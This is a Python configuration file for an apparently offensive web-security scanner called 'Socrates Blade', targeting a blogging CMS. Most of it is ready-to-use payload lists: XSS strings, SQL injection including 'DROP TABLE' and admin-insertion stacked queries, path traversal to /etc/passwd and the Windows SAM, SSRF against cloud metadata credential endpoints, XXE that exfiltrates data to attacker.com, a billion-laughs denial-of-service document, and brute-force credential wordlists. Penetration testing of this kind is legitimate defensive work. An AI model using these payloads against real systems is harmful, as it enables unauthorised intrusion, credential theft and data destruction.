"""
Socrates Blade v3.2 - Security Testing Configuration
Blogware/Scriptlog CMS Specific Configuration

This configuration file contains:
- Payload definitions for all attack vectors
- Testing parameters and thresholds
- Aggressive mode settings
- Brute force configurations
- Reporting options
"""

import os

class Config:
    """
    Main configuration class for security testing.
    Supports both local and remote target testing.
    """
    
    # =============================================================================
    # XSS PAYLOADS - Cross-Site Scripting attack vectors
    # =============================================================================
    XSS_PAYLOADS = [
        # Basic script injection
        "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        
        # Image onerror injection
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert('XSS')>",
        "<image src=x onerror=alert(1)>",
        
        # SVG injection
        "<svg/onload=alert(1)>",
        "<svg><script>alert(1)</script></svg>",
        "<svg/onload=alert(document.cookie)>",
        
        # Event handlers
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        
        # JavaScript protocol
        "javascript:alert(1)",
        "javascript:alert('XSS')",
        "javascript:prompt(1)",
        
        # Data URI
        "data:text/html,<script>alert(1)</script>",
        
        # Polyglot payloads
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
        "\"><script>alert('XSS')</script>",
        "javascript:/*--></title></style></textarea></xmp></script>--><svg/onload=alert(1)>",
        
        # DOM-based XSS candidates
        "#<script>alert(1)</script>",
        "?search=<script>alert(1)</script>",
    ]
    
    # =============================================================================
    # SQL INJECTION PAYLOADS
    # =============================================================================
    SQLI_PAYLOADS = {
        # Error-based SQL injection
        "error": [
            "' OR 1=1 --",
            "' OR '1'='1",
            "' OR 1=1#",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "1' GROUP BY 1--",
            "1' GROUP BY 1,2--",
        ],
        
        # Time-based MySQL injection
        "time_mysql": [
            "' OR IF(1=1, SLEEP({sleep_time}), 0) --",
            "' OR (SELECT COUNT(*) FROM users) > 0 AND SLEEP({sleep_time})--",
            "1' AND (SELECT * FROM (SELECT SLEEP({sleep_time}))a)--",
            "1'; IF(1=1) SLEEP({sleep_time})--",
            "1\" AND SLEEP({sleep_time})--",
        ],
        
        # Time-based SQLite injection
        "time_sqlite": [
            "' OR (SELECT 1 FROM (SELECT COUNT(*),1 AS b FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) GROUP BY b) AS x) --",
            "1' AND (SELECT COUNT(*) FROM sqlite_master)>0 AND SLEEP({sleep_time})--",
        ],
        
        # Time-based PostgreSQL injection
        "time_pgsql": [
            "' OR 1=1 AND (SELECT 2934 FROM (SELECT SLEEP({sleep_time}))x)--",
            "1; SELECT pg_sleep({sleep_time})--",
        ],
        
        # Boolean-based blind SQLi
        "boolean_mysql": [
            "' AND 1=1 --",
            "' AND 1=2 --",
            "1' AND (SELECT COUNT(*) FROM users)>0--",
            "1' AND (SELECT LENGTH(database()))>0--",
        ],
        
        # Stacked queries (MySQL)
        "stacked": [
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES(1,'hacker','password')--",
            "'; UPDATE users SET admin=1 WHERE username='admin'--",
        ],
        
        # Comment-based injection
        "comment": [
            "1'/**/OR/**/1=1--",
            "1'/*!50000UNION*/SELECT*/**/NULL--",
        ],
    }
    
    # =============================================================================
    # PATH TRAVERSAL PAYLOADS
    # =============================================================================
    TRAVERSAL_PAYLOADS = {
        "unix": [
            "../../../../etc/passwd",
            "../../../../etc/passwd%00",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        ],
        "windows": [
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam",
            "....\\\\....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
        ],
        "php_wrapper": [
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "phar://../../../../uploads/shell.jpg/shell.php",
        ],
    }
    
    # =============================================================================
    # SSRF PAYLOADS - Server-Side Request Forgery
    # =============================================================================
    SSRF_PAYLOADS = {
        # AWS Metadata (most common SSRF target)
        "aws_metadata": {
            "http://169.254.169.254/latest/meta-data/": "instance-id",
            "http://169.254.169.254/latest/user-data/": None,
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/": None,
            "http://169.254.169.254/latest/api/token": "TOKEN",
        },
        
        # Google Cloud Metadata
        "gcp_metadata": {
            "http://metadata.google.internal/computeMetadata/v1/instance/id": "instance",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id": "project",
        },
        
        # Azure Metadata
        "azure_metadata": {
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01": "compute",
        },
        
        # Localhost variations
        "localhost": {
            "http://127.0.0.1:80/": None,
            "http://localhost:8080/": None,
            "http://0.0.0.0:8000/": None,
        },
        
        # Protocol smuggling
        "protocol": {
            "dict://127.0.0.1:11211/stat": None,
            "gopher://127.0.0.1:6379/_INFO": None,
            "sftp://127.0.0.1:22/": None,
        },
        
        # URL encoding bypass
        "encoding": {
            "http://127.0.0.1:80/%2F%2F%2F%2F": None,
            "http://127.0.0.1:80/././././": None,
        },
    }
    
    # =============================================================================
    # BRUTE FORCE CONFIGURATION
    # =============================================================================
    BRUTE_FORCE = {
        "default_passwords": [
            "password", "123456", "12345678", "qwerty", "abc123",
            "monkey", "1234567", "letmein", "trustno1", "dragon",
            "baseball", "iloveyou", "master", "sunshine", "ashley",
            "bailey", "passw0rd", "shadow", "123123", "654321",
            "superman", "qazwsx", "michael", "football", "password1",
            "password123", "welcome", "admin", "login", "pass",
            "hello", "charlie", "donald", "password1234", "qwerty123",
        ],
        "default_usernames": [
            "admin", "administrator", "root", "user", "test",
            "guest", "demo", "operator", "webadmin", "manager",
            "user1", "testuser", "admin1", "administrator1", "webmaster",
        ],
        "max_attempts": 10,
        "lockout_duration": 300,  # 5 minutes
        "delay_between_attempts": 1,  # seconds
    }
    
    # =============================================================================
    # TESTING PARAMETERS
    # =============================================================================
    
    # Request timeouts
    REQUEST_TIMEOUT = 5  # seconds
    AGGRESSIVE_TIMEOUT = 30  # Maximum for time-based attacks
    
    # Time-based injection sleep time (configurable)
    SQLI_SLEEP_TIME = 5  # Normal mode
    AGGRESSIVE_SLEEP_TIME = 15  # Aggressive mode
    
    # Concurrency settings
    CONCURRENCY_LEVEL = 5
    AGGRESSIVE_CONCURRENCY = 10
    
    # Candidate parameters for SSRF/Traversal testing
    A10_CANDIDATE_PARAMS = [
        'url', 'file', 'path', 'dest', 'link', 'src', 'source',
        'data', 'reference', 'page', 'feed', 'host', 'port',
        'to', 'out', 'view', 'dir', 'show', 'name', 'conf', 'doc',
    ]
    
    # Sensitive keywords for IDOR detection
    SENSITIVE_KEYWORDS = [
        'password', 'passwd', 'secret', 'token', 'key',
        '"id":', '"username":', 'user_id', 'session',
        'config', 'database', 'db_', 'admin',
    ]
    
    # =============================================================================
    # SECURITY HEADERS - A05 Security Misconfiguration
    # =============================================================================
    A05_REQUIRED_HEADERS = [
        'Content-Security-Policy',      # CSP
        'X-Frame-Options',              # Clickjacking protection
        'X-Content-Type-Options',       # MIME sniffing
        'Referrer-Policy',               # Referrer disclosure
        'Strict-Transport-Security',     # HSTS (HTTPS only)
        'Permissions-Policy',           # Feature policy
        'X-XSS-Protection',             # XSS filter (legacy but check)
    ]
    
    # Optional security headers
    A05_OPTIONAL_HEADERS = [
        'Cross-Origin-Opener-Policy',
        'Cross-Origin-Resource-Policy',
        'Cross-Origin-Embedder-Policy',
    ]
    
    # =============================================================================
    # ERROR SIGNATURES - For detecting vulnerabilities
    # =============================================================================
    ERROR_SIGNATURES = {
        "sql": [
            "sql syntax", "sqlite error", "pdoexception", "mysql error",
            "postgresql", "ora-00900", "ora-01789", "microsoft sql native",
            "incorrect syntax", "unterminated", "sql command not properly",
        ],
        "xss": [
            "<script", "javascript:", "onerror=", "onload=",
            "alert(", "prompt(", "confirm(",
        ],
        "xxe": [
            "simplexml_load_string", "xml parsing error", "entity",
            "DOCTYPE", "external entity",
        ],
        "path": [
            "root:x:0:0", "[boot loader]", "DB_PASSWORD", "No such file",
            "Permission denied", "open_basedir",
        ],
    }
    
    # =============================================================================
    # WORDPRESS IMPORT XXE PAYLOADS
    # =============================================================================
    XXE_PAYLOADS = {
        "basic": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>',
        ],
        "blind": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/steal?data=XXE">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo>&bar;</foo>',
        ],
        "billion_laughs": [
            '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',
        ],
    }
    
    # =============================================================================
    # CSRF TEST CONFIGURATION
    # =============================================================================
    CSRF_PATTERNS = [
        'token', 'csrf', 'nonce', '_wpnonce', 'security',
        'form_token', 'request_token', 'auth_token',
    ]
    
    # =============================================================================
    # API TESTING CONFIGURATION
    # =============================================================================
    API_ENDPOINTS = [
        "/api/v1/posts",
        "/api/v1/comments",
        "/api/v1/categories",
        "/api/v1/tags",
        "/api/v1/users",
        "/api/v1/search",
        "/api/v1/auth/login",
        "/api/v1/auth/reset-password",
    ]
    
    # =============================================================================
    # AUTHENTICATION BYPASS PAYLOADS
    # =============================================================================
    AUTH_BYPASS_PAYLOADS = {
        "sql_login": [
            "' OR 1=1 --",
            "' OR '1'='1' --",
            "admin' --",
            "admin' #",
            "' OR 1=1 LIMIT 1--",
            "1' OR '1'='1",
            "' OR ''='",
        ],
        "json_login": [
            '{"username":"admin","password":"admin"}',
            '{"username":"admin","password":"\' OR 1=1--"}',
        ],
        "null_bytes": [
            "admin%00",
            "admin\n",
            "admin\r",
            "admin\x00",
        ],
    }
    
    # =============================================================================
    # CORS TESTING
    # =============================================================================
    CORS_HEADERS = [
        'Access-Control-Allow-Origin',
        'Access-Control-Allow-Methods',
        'Access-Control-Allow-Headers',
        'Access-Control-Allow-Credentials',
        'Access-Control-Max-Age',
    ]
    
    # =============================================================================
    # REPORTING CONFIGURATION
    # =============================================================================
    REPORT_CONFIG = {
        "json_indent": 4,
        "html_template": "template.html",
        "include_evidence": True,
        "include_curl": True,
        "include_http_headers": True,
    }
    
    # =============================================================================
    # PROXY CONFIGURATION
    # =============================================================================
    PROXY_SETTINGS = {
        "http": None,
        "https": None,
        "timeout": 30,
    }
    
    # =============================================================================
    # HELPER METHODS
    # =============================================================================
    
    @classmethod
    def get_sql_time_payload(cls, sleep_time=None):
        """Get time-based SQLi payload with configured sleep time"""
        if sleep_time is None:
            sleep_time = cls.SQLI_SLEEP_TIME
        payloads = []
        for p in cls.SQLI_PAYLOADS.get('time_mysql', []):
            payloads.append(p.format(sleep_time=sleep_time))
        for p in cls.SQLI_PAYLOADS.get('time_sqlite', []):
            payloads.append(p)
        return payloads
    
    @classmethod
    def get_all_xss_payloads(cls):
        """Get all XSS payloads from config and external file"""
        payloads = cls.XSS_PAYLOADS.copy()
        payload_file = os.path.join(os.path.dirname(__file__), 'payloads', 'xss.txt')
        if os.path.exists(payload_file):
            with open(payload_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        payloads.append(line)
        return payloads
    
    @classmethod
    def get_all_sqli_payloads(cls):
        """Get all SQLi payloads"""
        payloads = []
        for category in cls.SQLI_PAYLOADS.values():
            if isinstance(category, list):
                payloads.extend(category)
        payload_file = os.path.join(os.path.dirname(__file__), 'payloads', 'sqli.txt')
        if os.path.exists(payload_file):
            with open(payload_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        payloads.append(line)
        return payloads
    
    @classmethod
    def get_all_traversal_payloads(cls):
        """Get all path traversal payloads"""
        payloads = []
        for category in cls.TRAVERSAL_PAYLOADS.values():
            if isinstance(category, dict):
                payloads.extend(category.keys())
            elif isinstance(category, list):
                payloads.extend(category)
        payload_file = os.path.join(os.path.dirname(__file__), 'payloads', 'traversal.txt')
        if os.path.exists(payload_file):
            with open(payload_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        payloads.append(line)
        return payloads
    
    @classmethod
    def get_all_ssrf_payloads(cls):
        """Get all SSRF payloads"""
        payloads = {}
        for category in cls.SSRF_PAYLOADS.values():
            if isinstance(category, dict):
                payloads.update(category)
        payload_file = os.path.join(os.path.dirname(__file__), 'payloads', 'ssrf.txt')
        if os.path.exists(payload_file):
            with open(payload_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Format: URL|Marker
                        if '|' in line:
                            url, marker = line.split('|', 1)
                            payloads[url.strip()] = marker.strip()
                        else:
                            payloads[line] = None
        return payloads
    
    @classmethod
    def get_brute_force_passwords(cls, custom_wordlist=None):
        """Get passwords for brute force testing"""
        passwords = []
        if custom_wordlist and os.path.exists(custom_wordlist):
            with open(custom_wordlist, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        passwords.append(line)
        passwords.extend(cls.BRUTE_FORCE["default_passwords"])
        return list(set(passwords))
    
    @classmethod
    def get_brute_force_usernames(cls, custom_wordlist=None):
        """Get usernames for brute force testing"""
        usernames = []
        if custom_wordlist and os.path.exists(custom_wordlist):
            with open(custom_wordlist, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        usernames.append(line)
        usernames.extend(cls.BRUTE_FORCE["default_usernames"])
        return list(set(usernames))


class Severity:
    """Severity level constants"""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"
    
    LEVELS = [CRITICAL, HIGH, MEDIUM, LOW, INFO]


class OWASP:
    """OWASP Top 10 2021 categories"""
    A01 = "A01 - Broken Access Control"
    A02 = "A02 - Cryptographic Failures"
    A03 = "A03 - Injection"
    A04 = "A04 - Insecure Design"
    A05 = "A05 - Security Misconfiguration"
    A06 = "A06 - Vulnerable Components"
    A07 = "A07 - Auth Failures"
    A08 = "A08 - Data Integrity Failures"
    A09 = "A09 - Logging Failures"
    A10 = "A10 - SSRF"


# CWE mappings for findings
CWE_MAPPINGS = {
    "xss": ["CWE-79", "CWE-80", "CWE-81", "CWE-82", "CWE-83", "CWE-84", "CWE-85"],
    "sqli": ["CWE-89", "CWE-90", "CWE-564", "CWE-656"],
    "idor": ["CWE-639", "CWE-22", "CWE-862"],
    "csrf": ["CWE-352"],
    "ssrf": ["CWE-918"],
    "xxe": ["CWE-611", "CWE-827"],
    "traversal": ["CWE-22", "CWE-23", "CWE-36"],
    "auth_bypass": ["CWE-287", "CWE-306", "CWE-862"],
    "misconfiguration": ["CWE-16", "CWE-400", "CWE-754"],
}


if __name__ == "__main__":
    print("Socrates Blade v3.2 Configuration")
    print(f"XSS Payloads: {len(Config.XSS_PAYLOADS)}")
    print(f"SQLi Payloads: {len(Config.get_all_sqli_payloads())}")
    print(f"Traversal Payloads: {len(Config.get_all_traversal_payloads())}")
    print(f"SSRF Payloads: {len(Config.get_all_ssrf_payloads())}")
